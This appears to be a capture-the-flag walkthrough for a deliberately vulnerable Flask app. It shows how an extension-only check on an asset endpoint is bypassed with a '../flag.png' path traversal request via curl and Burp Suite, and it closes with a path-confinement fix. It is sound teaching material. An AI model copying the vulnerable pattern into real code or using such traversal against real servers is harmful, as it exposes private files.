# Medialoft — Solution / Walkthrough

> ⚠️ **Spoilers ahead.** Try the challenge yourself before reading.

## The vulnerability (level 4 — extension check)

`app/routes.py` guards the asset endpoint with a single check:

```python
if not name.endswith(allowed_ext):          # allowed_ext == ".png"
    return render_error(400, ...)
target_path = os.path.join(media_dir, name)  # no normalization, no boundary check
return send_file(target_path, ...)
```

An extension allow-list is **not** a path boundary. It happily accepts any
name that ends in `.png`, including one full of `../`. The path is then joined
onto the media directory with no normalization, so the request escapes it. The
only consequence of the check is that your traversal target must *also* end in
`.png` — and the flag is stored as `flag.png` precisely to make that point.

## Exploitation

Normal, intended request:

```
GET /asset?name=aurora.png
```

A non-`.png` traversal is blocked by the check (so it *feels* safe):

```
GET /asset?name=../secret.txt   -> 400 (fails the .png check)
```

But a `.png` target sails straight through and escapes the directory:

```
GET /asset?name=../flag.png
```

With `curl`:

```bash
curl --path-as-is "http://localhost:5000/asset?name=../flag.png"
```

Expected output:

```
FLAG{MEDIALOFT_OUT_OF_BOUNDS}
```

### Going further

Any file you can rename/target with a `.png` suffix is reachable. On a real
system this bypass is common when apps trust a file extension as a security
control (it never is).

## Doing it in Burp Suite

1. Proxy your browser through Burp and open <http://localhost:5000>.
2. Open any asset — capture the `GET /asset?name=...` request in **Proxy > HTTP history**.
3. Send it to **Repeater**.
4. Try `name=../secret.txt` → blocked (400). The app clearly checks something.
5. Try `name=../flag.png` → it ends in `.png`, passes the check, and returns the flag.

## The fix

Validate the *resolved path*, not the extension. An allow-list of extensions is
fine for content-type decisions but must never be mistaken for a traversal
defense:

```python
import os
from flask import abort, send_file

def safe_path(base_dir: str, user_supplied: str) -> str:
    full = os.path.realpath(os.path.join(base_dir, user_supplied))
    base = os.path.realpath(base_dir)
    if os.path.commonpath([full, base]) != base:
        abort(403)
    return full
```

Better still: serve assets by an opaque id mapped server-side, or use Flask's
`send_from_directory`, which performs a safe join for you. Keep the extension
check too if you like — but only *after* the path has been confined.
